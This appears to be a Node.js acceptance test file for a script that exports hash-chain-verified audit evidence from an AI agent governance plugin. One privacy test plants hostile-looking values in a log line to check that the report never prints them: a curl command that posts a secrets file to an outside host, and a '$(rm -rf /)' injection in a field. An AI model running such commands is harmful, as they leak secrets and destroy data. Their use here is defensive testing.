// SPDX-License-Identifier: AGPL-3.0-or-later
//
// Black-box acceptance tests for the control-evidence export (harness-governance Tranche 3, Step 30):
// plugins/assist-plugin/scripts/export-control-evidence.js.
//
// Sources: docs/requirements/FR-NFR-harness-governance.md section 2.16 (FR-229: Export for a verified range, Range with a
// break), NFR-030, NFR-031; specs/spec-hooks-health-check.md, Change Log 2026-11-06 (Tranche 3), "Requirement: Control
// evidence export"; specs/spec-skills-health.md, "Requirement: Export control evidence"; plugins/assist-plugin/skills/health/
// SKILL.md, "Export control evidence" (the exit table and the report lines). Task plan: docs/task-plans/task-plan-harness-
// governance-20261028-0759.md, Steps 29 and 30.
//
// Traceability format: [AC-N | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | BR-020 | NFR-030]. The
// spec carries no SPEC-NNN id, so it is cited by file name. AC-N is the position of the Scenario inside the Requirement:
//   AC-1 Export for a verified range, AC-2 Range with a break
//
// Contract used (the script header and the health skill):
//   node scripts/export-control-evidence.js --from YYYY-MM-DD --to YYYY-MM-DD [--root DIR] [--data-dir DIR]
//   The range is inclusive and read in UTC. `--root` is the project root that holds .agent/; `--data-dir` is the plugin data
//   directory that holds fsa-log.jsonl.
//   Exit 0, verified: stdout `Chain verification: VERIFIED for this range.`, then the counts and the listed events by type
//     (denies, asks, gate evidence, approvals, disclosures, disablements). A missing or empty log verifies as zero lines.
//   Exit 1, unverified: stdout `Chain verification: UNVERIFIED.` and a `... chain BROKEN at line N (segment NAME, line M of
//     that segment)` line. A break after the end of the range leaves the range verified; a break at or before it does not.
//   Exit 2, cannot export: `Cannot export control evidence: ...` on stderr (a missing or unreal date, an unknown project root,
//     or an unreadable segment).
//   The report holds event types, counts, times, segment names and line numbers, and short identifiers. It holds no prompt
//     text, command text, file contents, path, or secret. The script is read-only.
//   Module exports: EXIT_VERIFIED, EXIT_UNVERIFIED, EXIT_CANNOT_EXPORT, parseArgs(argv) -> {from, to, root, dataDir},
//     check({from, to, root, dataDir}) -> {code, lines}, report(outcome).
//
// The logs are generated into temp directories (tests/fixtures/audit/). The real-hook evidence is produced by running the
// plugin's own hooks against a temp project.
//
// Run: node --test tests/scripts/export-control-evidence.test.js

"use strict";

const { test, after } = require("node:test");
const assert = require("node:assert");
const childProcess = require("node:child_process");
const fs = require("node:fs");
const path = require("node:path");

const fx = require("../fixtures/audit/chain-fixture.js");

const SCRIPT = path.join(fx.PLUGIN, "scripts", "export-control-evidence.js");
const exporter = require(SCRIPT);
const audit = fx.auditChain;

const JAN = { from: "2026-01-01", to: "2026-01-31" };

after(() => {
  fx.cleanup();
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function text(outcome) {
  return outcome.lines.join("\n");
}

function exportRange(range, root, dataDir) {
  return exporter.check({ from: range.from, to: range.to, root: root, dataDir: dataDir || fx.tempDir("export-data-") });
}

function cli(args, options) {
  const opts = options || {};
  return childProcess.spawnSync(process.execPath, [SCRIPT].concat(args), {
    cwd: opts.cwd || fx.tempDir("export-cwd-"),
    env: fx.cleanEnv(opts.env),
    encoding: "utf8",
    timeout: 60000,
  });
}

// A valid chain whose lines carry the given timestamps (ISO strings). `extra(i)` adds fields to line i (0-based).
function datedLines(stamps, extra) {
  let prev = audit.GENESIS_HASH;
  return stamps.map((ts, i) => {
    const line = JSON.stringify(Object.assign({ ts: ts, prev: prev, event: "fixture-event", rule_id: fx.MARKER, n: i + 1 }, extra ? extra(i) : {}));
    prev = fx.sha256Hex(line);
    return line;
  });
}

function dayStamps(prefix, count, startDay) {
  const out = [];
  for (let i = 0; i < count; i += 1) {
    out.push(prefix + "-" + String(startDay + i).padStart(2, "0") + "T12:00:00.000Z");
  }
  return out;
}

function snapshot(dir) {
  const result = {};
  if (!fs.existsSync(dir)) return result;
  (function walk(current) {
    fs.readdirSync(current).forEach((name) => {
      const full = path.join(current, name);
      if (fs.statSync(full).isDirectory()) walk(full);
      else result[path.relative(dir, full)] = fs.readFileSync(full, "utf8");
    });
  })(dir);
  return result;
}

function utcDate(offsetDays) {
  return new Date(Date.now() + offsetDays * 24 * 60 * 60 * 1000).toISOString().slice(0, 10);
}

// ---------------------------------------------------------------------------
// The module surface
// ---------------------------------------------------------------------------

test("[Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the exit codes are 0 verified, 1 unverified, 2 cannot export", () => {
  assert.strictEqual(exporter.EXIT_VERIFIED, 0);
  assert.strictEqual(exporter.EXIT_UNVERIFIED, 1);
  assert.strictEqual(exporter.EXIT_CANNOT_EXPORT, 2);
  assert.strictEqual(typeof exporter.parseArgs, "function");
  assert.strictEqual(typeof exporter.check, "function");
  assert.strictEqual(typeof exporter.report, "function");
});

test("[Control evidence export | spec-hooks-health-check | FR-229 | UR-067] parseArgs reads --from, --to, --root, and --data-dir", () => {
  const parsed = exporter.parseArgs(["node", "export-control-evidence.js", "--from", "2026-01-01", "--to", "2026-06-30", "--root", "/proj", "--data-dir", "/data"]);
  assert.strictEqual(parsed.from, "2026-01-01");
  assert.strictEqual(parsed.to, "2026-06-30");
  assert.strictEqual(parsed.root, "/proj");
  assert.strictEqual(parsed.dataDir, "/data");
});

test("[Control evidence export | spec-hooks-health-check | FR-229] parseArgs leaves an absent flag, and a flag with no value, unset", () => {
  // Null/empty input space.
  const none = exporter.parseArgs(["node", "export-control-evidence.js"]);
  assert.ok(none.from == null && none.to == null && none.root == null && none.dataDir == null, JSON.stringify(none));
  const dangling = exporter.parseArgs(["node", "export-control-evidence.js", "--from", "2026-01-01", "--to"]);
  assert.strictEqual(dangling.from, "2026-01-01");
  assert.ok(dangling.to == null, "a flag with no value is unset: " + JSON.stringify(dangling));
  assert.doesNotThrow(() => exporter.parseArgs([]));
});

// ---------------------------------------------------------------------------
// AC-1: an export for a verified range lists the control events by type and shows the chain verified
// ---------------------------------------------------------------------------

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | BR-020] an intact chain over a range exits 0 and reports the chain verified", () => {
  const root = fx.tempRoot("export-verified-");
  fx.writeChain(root, [50]);
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 0, text(out));
  assert.ok(/Chain verification: VERIFIED for this range\./.test(text(out)), text(out));
  assert.ok(!/UNVERIFIED/.test(text(out)), text(out));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-030] an intact chain across rotated segments exits 0 and reports the chain verified across every cut", () => {
  const root = fx.tempRoot("export-segments-");
  fx.writeChain(root, [20, 20, 20]);
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 0, text(out));
  assert.ok(/Chain verification: VERIFIED/.test(text(out)), text(out));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] a project with no log at all verifies as zero lines and exits 0", () => {
  const root = fx.tempRoot("export-nolog-");
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 0, text(out));
  assert.ok(/VERIFIED/.test(text(out)), text(out));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] an empty log file verifies and exits 0", () => {
  const root = fx.tempRoot("export-empty-");
  fx.plantLines(root, []);
  assert.strictEqual(exportRange(JAN, root).code, 0);
});

// Evidence from the plugin's own hooks, in a temp project, over a range that holds today.
let realRoot = null;
let realData = null;

function realEvidence() {
  if (realRoot) return { root: realRoot, data: realData };
  const root = fx.tempRoot("export-real-");
  const dataDir = fx.tempDir("export-real-data-");
  const write = (relative, content) => {
    const file = path.join(root, relative);
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, content);
  };
  write(
    ".agent/governance/profile.json",
    JSON.stringify({
      student_record_patterns: [{ name: "sid", pattern: "\\bS\\d{8}\\b" }],
      ferpa_receiving_parties: ["district-registrar"],
      data_classes: { "student-record": ["records/**"], PHI: ["data/patients*.csv"] },
    })
  );
  write(
    ".agent/main-plan/plan-export-20261106.md",
    ["# Plan: export fixture", "", "## Summary", "", "Fixture plan.", "", "### User Decisions", "", "- Approved: 2026-11-06 09:30 (Writer: orchestrator)", ""].join("\n")
  );
  const pre = (tool, toolInput, extra) => Object.assign({ hook_event_name: "PreToolUse", session_id: "sess-export-1", tool_name: tool, tool_input: toolInput, cwd: root }, extra || {});
  const subagent = { agent_type: "developer", agent_id: "agent-dev-1" };
  // Two denies.
  fx.runHook("fsa-write-bar", pre("Write", { file_path: path.join(root, "DECISIONS.md"), content: "x" }, subagent));
  fx.runHook("fsa-write-bar", pre("Write", { file_path: path.join(root, "DECISIONS.md"), content: "y" }, subagent));
  // One ask.
  fx.runHook("pr-post-ask", pre("Bash", { command: "gh pr comment 42 --body 'Looks good'" }));
  // One recorded disclosure.
  fx.runHook(
    "ferpa-disclosure-guard",
    pre("WebFetch", { url: "https://sis.example.test/export", prompt: "S12345678 grade report\nReceiving-Party: district-registrar\nLegitimate-Interest: accreditation-review" })
  );
  // One access under an approved plan.
  fx.runHook("data-access-log", pre("Read", { file_path: path.join(root, "records", "grades.csv") }, subagent));
  // One logged guard disablement.
  fs.writeFileSync(path.join(dataDir, "hooks-disabled.json"), JSON.stringify({ "retired-hook": { reason: "test fixture", ts: "2026-10-16T00:00:00.000Z" } }));
  fx.runHook("health-check", undefined, { args: ["--session-start"], cwd: root, dataDir: dataDir, env: { CLAUDE_PROJECT_DIR: root } });
  realRoot = root;
  realData = dataDir;
  return { root: root, data: dataDir };
}

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | BR-020] a range that holds the plugin's own hook evidence lists the control events by type and reports the chain verified", () => {
  const evidence = realEvidence();
  const out = exporter.check({ from: utcDate(-1), to: utcDate(1), root: evidence.root, dataDir: evidence.data });
  assert.strictEqual(out.code, 0, text(out));
  const body = text(out).toLowerCase();
  assert.ok(/chain verification: verified/.test(body), body);
  assert.ok(/den(y|ies)/.test(body), "denies are listed by type: " + body);
  assert.ok(/\bask/.test(body), "asks are listed by type: " + body);
  assert.ok(/disclosure/.test(body), "disclosures are listed by type: " + body);
  assert.ok(/approval/.test(body), "approvals are listed by type: " + body);
  assert.ok(/disablement|disabled/.test(body), "disablements are listed by type: " + body);
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the count of denies in the report is the count in the log", () => {
  const evidence = realEvidence();
  const out = exporter.check({ from: utcDate(-1), to: utcDate(1), root: evidence.root, dataDir: evidence.data });
  const denyLines = out.lines.filter((line) => /den(y|ies)/i.test(line));
  assert.ok(denyLines.length >= 1, text(out));
  assert.ok(denyLines.some((line) => /\b2\b/.test(line)), "two denies are in the log: " + denyLines.join(" | "));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] a range that holds none of the events counts none of them and still verifies the chain", () => {
  const evidence = realEvidence();
  const out = exporter.check({ from: "2020-01-01", to: "2020-12-31", root: evidence.root, dataDir: evidence.data });
  assert.strictEqual(out.code, 0, text(out));
  assert.ok(/VERIFIED/.test(text(out)), text(out));
  out.lines
    .filter((line) => /den(y|ies)|disclosure/i.test(line))
    .forEach((line) => assert.ok(!/\b[1-9]\d*\b/.test(line.replace(/\d{4}-\d{2}-\d{2}/g, "")), "a count outside the range: " + line));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the range edges are inclusive and read in UTC: a break on the last second of the end date is inside, a break at the next midnight is outside", () => {
  const stamps = ["2026-06-29T10:00:00.000Z", "2026-06-30T23:59:59.000Z", "2026-07-01T00:00:00.000Z", "2026-07-02T10:00:00.000Z"];
  const range = { from: "2026-06-01", to: "2026-06-30" };
  const inside = fx.tempRoot("export-edge-in-");
  fx.plantLines(inside, datedLines(stamps));
  fx.editLine(fx.currentLog(inside), 2);
  assert.strictEqual(exportRange(range, inside).code, 1, "line 2 is dated on the last second of the end date");
  const outside = fx.tempRoot("export-edge-out-");
  fx.plantLines(outside, datedLines(stamps));
  fx.editLine(fx.currentLog(outside), 3);
  assert.strictEqual(exportRange(range, outside).code, 0, "line 3 is dated at the next midnight");
});

// ---------------------------------------------------------------------------
// AC-2: a range with a break is marked unverified and names the first bad line
// ---------------------------------------------------------------------------

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | BR-020 | NFR-030] an edited line inside the range marks the range unverified, exits 1, and names the first bad line", () => {
  const root = fx.tempRoot("export-break-");
  fx.writeChain(root, [30]);
  fx.editLine(fx.currentLog(root), 7);
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 1, text(out));
  assert.ok(/Chain verification: UNVERIFIED/.test(text(out)), text(out));
  assert.ok(!/Chain verification: VERIFIED/.test(text(out)), text(out));
  const named = /at line (\d+)/.exec(text(out));
  assert.ok(named, "the report names the first bad line: " + text(out));
  assert.strictEqual(Number(named[1]), 7);
  assert.ok(/BROKEN/i.test(text(out)), text(out));
});

[
  ["a deleted line", (file) => fx.deleteLine(file, 7)],
  ["a reordered pair of lines", (file) => fx.swapLines(file, 7, 8)],
].forEach((row) => {
  test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-030] " + row[0] + " inside the range marks it unverified and names a line next to the change", () => {
    const root = fx.tempRoot("export-break-");
    fx.writeChain(root, [30]);
    row[1](fx.currentLog(root));
    const out = exportRange(JAN, root);
    assert.strictEqual(out.code, 1, text(out));
    const named = /at line (\d+)/.exec(text(out));
    assert.ok(named, text(out));
    assert.ok(Number(named[1]) >= 6 && Number(named[1]) <= 8, "named line " + named[1]);
  });
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-032] a break inside a rotated segment names the line across all segments and the segment and its line", () => {
  const root = fx.tempRoot("export-break-seg-");
  fx.writeChain(root, [10, 10, 10]);
  fx.editLine(fx.segmentFiles(root).rotated[1], 5);
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 1, text(out));
  assert.ok(/at line 15\b/.test(text(out)), text(out));
  assert.ok(/audit-000002\.jsonl/.test(text(out)), "the segment is named: " + text(out));
  assert.ok(/line 5 of that segment/.test(text(out)), text(out));
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-032] a missing middle segment breaks the chain at the cut and marks the range unverified", () => {
  const root = fx.tempRoot("export-break-cut-");
  fx.writeChain(root, [10, 10, 10]);
  fs.rmSync(fx.segmentFiles(root).rotated[1]);
  assert.strictEqual(exportRange(JAN, root).code, 1);
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] a break before the start of the range still marks the range unverified: lines after it are not confirmed", () => {
  const root = fx.tempRoot("export-break-before-");
  fx.plantLines(root, datedLines(dayStamps("2025-11", 3, 10).concat(dayStamps("2026-03", 5, 1))));
  fx.editLine(fx.currentLog(root), 2);
  const out = exportRange({ from: "2026-03-01", to: "2026-03-31" }, root);
  assert.strictEqual(out.code, 1, text(out));
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] a break after the end of the range leaves the range verified", () => {
  const root = fx.tempRoot("export-break-after-");
  fx.plantLines(root, datedLines(dayStamps("2026-03", 5, 1).concat(dayStamps("2026-09", 5, 1))));
  fx.editLine(fx.currentLog(root), 8);
  const out = exportRange({ from: "2026-03-01", to: "2026-03-31" }, root);
  assert.strictEqual(out.code, 0, text(out));
  assert.ok(/Chain verification: VERIFIED/.test(text(out)), text(out));
});

// ---------------------------------------------------------------------------
// The second store: fsa-log.jsonl under the plugin data directory
// ---------------------------------------------------------------------------

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] an intact subagent log in the data directory leaves the range verified", () => {
  const root = fx.tempRoot("export-fsa-");
  const dataDir = fx.tempDir("export-fsa-data-");
  fx.writeChain(root, [10]);
  fs.writeFileSync(path.join(dataDir, "fsa-log.jsonl"), fx.buildChainLines(10).lines.join("\n") + "\n");
  const out = exportRange(JAN, root, dataDir);
  assert.strictEqual(out.code, 0, text(out));
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] a break in the subagent log inside the range marks the range unverified", () => {
  const root = fx.tempRoot("export-fsa-");
  const dataDir = fx.tempDir("export-fsa-data-");
  fx.writeChain(root, [10]);
  const file = path.join(dataDir, "fsa-log.jsonl");
  fs.writeFileSync(file, fx.buildChainLines(10).lines.join("\n") + "\n");
  fx.editLine(file, 4);
  const out = exportRange(JAN, root, dataDir);
  assert.strictEqual(out.code, 1, text(out));
  assert.ok(/UNVERIFIED/.test(text(out)), text(out));
});

// ---------------------------------------------------------------------------
// Exit 2: cannot export
// ---------------------------------------------------------------------------

[
  ["no from date", { to: "2026-01-31" }],
  ["no to date", { from: "2026-01-01" }],
  ["no dates at all", {}],
  ["a from date that is not a real date", { from: "2026-02-30", to: "2026-03-31" }],
  ["a to date that is not a real date", { from: "2026-01-01", to: "2026-13-01" }],
  ["a date in another format", { from: "01/01/2026", to: "01/31/2026" }],
  ["text that is not a date", { from: "yesterday", to: "today" }],
  ["an empty date", { from: "", to: "2026-01-31" }],
  ["a date that is a number", { from: 20260101, to: 20260131 }],
].forEach((row) => {
  test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] " + row[0] + " cannot be exported: exit 2 with the cannot-export message, never a verified report", () => {
    // Null, empty, invalid, and type-mismatch input space.
    const root = fx.tempRoot("export-bad-range-");
    fx.writeChain(root, [5]);
    let out;
    assert.doesNotThrow(() => {
      out = exporter.check(Object.assign({ root: root, dataDir: fx.tempDir("export-data-") }, row[1]));
    });
    assert.strictEqual(out.code, 2, text(out));
    assert.ok(/Cannot export control evidence/.test(text(out)), text(out));
    assert.ok(!/VERIFIED/.test(text(out)), text(out));
  });
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] an unreadable current segment (it is a directory) cannot be exported: exit 2, never a verified report", () => {
  const root = fx.tempRoot("export-unreadable-");
  fs.mkdirSync(fx.currentLog(root), { recursive: true });
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 2, text(out));
  assert.ok(/Cannot export control evidence/.test(text(out)), text(out));
  assert.ok(!/VERIFIED/.test(text(out)), text(out));
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] an unreadable rotated segment cannot be exported: exit 2", () => {
  const root = fx.tempRoot("export-unreadable-seg-");
  fx.writeChain(root, [5, 5]);
  const rotated = fx.segmentFiles(root).rotated[0];
  fs.rmSync(rotated);
  fs.mkdirSync(rotated);
  assert.strictEqual(exportRange(JAN, root).code, 2);
});

// ---------------------------------------------------------------------------
// The command line
// ---------------------------------------------------------------------------

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the command exits 0 and prints the verified report on stdout for an intact chain", () => {
  const root = fx.tempRoot("export-cli-");
  fx.writeChain(root, [20]);
  const res = cli(["--from", JAN.from, "--to", JAN.to, "--root", root, "--data-dir", fx.tempDir("export-cli-data-")]);
  assert.strictEqual(res.status, 0, res.stdout + res.stderr);
  assert.ok(/Chain verification: VERIFIED for this range\./.test(res.stdout), res.stdout);
  assert.strictEqual(res.stderr, "");
});

test("[AC-2 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the command exits 1 and names the first bad line on stdout for a broken chain", () => {
  const root = fx.tempRoot("export-cli-");
  fx.writeChain(root, [20]);
  fx.editLine(fx.currentLog(root), 7);
  const res = cli(["--from", JAN.from, "--to", JAN.to, "--root", root, "--data-dir", fx.tempDir("export-cli-data-")]);
  assert.strictEqual(res.status, 1, res.stdout + res.stderr);
  assert.ok(/Chain verification: UNVERIFIED/.test(res.stdout), res.stdout);
  assert.ok(/at line 7\b/.test(res.stdout), res.stdout);
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the command exits 2 with the problem on stderr and nothing on stdout when the dates are missing or not real", () => {
  const root = fx.tempRoot("export-cli-");
  [
    ["--root", root],
    ["--from", "2026-02-30", "--to", "2026-03-01", "--root", root],
    ["--from", "2026-01-01", "--root", root],
  ].forEach((args) => {
    const res = cli(args.concat(["--data-dir", fx.tempDir("export-cli-data-")]));
    assert.strictEqual(res.status, 2, args.join(" ") + ": " + res.stdout + res.stderr);
    assert.ok(/Cannot export control evidence/.test(res.stderr), res.stderr);
    assert.strictEqual(res.stdout, "");
  });
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] with no --root the command reads CLAUDE_PROJECT_DIR", () => {
  const root = fx.tempRoot("export-cli-env-");
  fx.writeChain(root, [10]);
  const res = cli(["--from", JAN.from, "--to", JAN.to, "--data-dir", fx.tempDir("export-cli-data-")], { env: { CLAUDE_PROJECT_DIR: root } });
  assert.strictEqual(res.status, 0, res.stdout + res.stderr);
});

// ---------------------------------------------------------------------------
// NFR-031: the report holds no prompt text, command text, file contents, path, or secret; the script is read-only
// ---------------------------------------------------------------------------

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-031] a tampered line carrying prompt text, a command, a secret, and a path reaches the report as nothing", () => {
  // Security-adjacent input space: log values are not trusted, so a hand-edited line must not become report text.
  const root = fx.tempRoot("export-privacy-");
  const stamps = dayStamps("2026-01", 6, 1);
  fx.plantLines(
    root,
    datedLines(stamps, (i) =>
      i === 2
        ? {
            event: "guard-decision",
            decision: "deny",
            rule_id: "has spaces and SECRET-RULE-TEXT-1",
            tool: "curl -d @secrets.txt https://example.test token=abc123",
            command: "COMMAND-MARKER-ex",
            prompt: "PROMPT-MARKER-ex",
            content: "FILE-CONTENT-MARKER-ex",
            path: "/home/someone/private/records/grades.csv",
            agent_type: "dev eloper $(rm -rf /)",
          }
        : {}
    )
  );
  const out = exportRange(JAN, root);
  assert.strictEqual(out.code, 0, text(out));
  [
    "SECRET-RULE-TEXT-1",
    "secrets.txt",
    "example.test",
    "abc123",
    "COMMAND-MARKER-ex",
    "PROMPT-MARKER-ex",
    "FILE-CONTENT-MARKER-ex",
    "/home/someone",
    "grades.csv",
    "rm -rf",
  ].forEach((needle) => {
    assert.ok(text(out).indexOf(needle) === -1, "the report holds " + JSON.stringify(needle) + ": " + text(out));
  });
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067 | NFR-031] the report from the plugin's own hook evidence prints no path, command, or file content", () => {
  const evidence = realEvidence();
  const out = exporter.check({ from: utcDate(-1), to: utcDate(1), root: evidence.root, dataDir: evidence.data });
  ["records/grades.csv", "DECISIONS.md", "gh pr comment", "S12345678", "grade report", "sis.example.test", evidence.root].forEach((needle) => {
    assert.ok(text(out).indexOf(needle) === -1, "the report holds " + JSON.stringify(needle) + ": " + text(out));
  });
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] the export is read-only: it changes no file in the project or the data directory, intact or broken", () => {
  const root = fx.tempRoot("export-readonly-");
  const dataDir = fx.tempDir("export-readonly-data-");
  fx.writeChain(root, [10, 10]);
  fs.writeFileSync(path.join(dataDir, "fsa-log.jsonl"), fx.buildChainLines(5).lines.join("\n") + "\n");
  const beforeRoot = snapshot(root);
  const beforeData = snapshot(dataDir);
  exportRange(JAN, root, dataDir);
  assert.deepStrictEqual(snapshot(root), beforeRoot, "an intact chain is left as it was");
  fx.editLine(fx.currentLog(root), 3);
  const editedRoot = snapshot(root);
  exportRange(JAN, root, dataDir);
  assert.deepStrictEqual(snapshot(root), editedRoot, "a broken chain is reported, never repaired or truncated");
  assert.deepStrictEqual(snapshot(dataDir), beforeData);
  assert.notDeepStrictEqual(editedRoot, beforeRoot, "set-up: the edit changed the log");
});

test("[AC-1 | Control evidence export | spec-hooks-health-check | FR-229 | UR-067] check never throws, whatever the options are", () => {
  [undefined, null, {}, [], "text", 42].forEach((options) => {
    let out;
    assert.doesNotThrow(() => {
      out = exporter.check(options);
    }, "check threw for " + JSON.stringify(options));
    assert.ok(out && typeof out.code === "number" && Array.isArray(out.lines), JSON.stringify(out));
  });
});
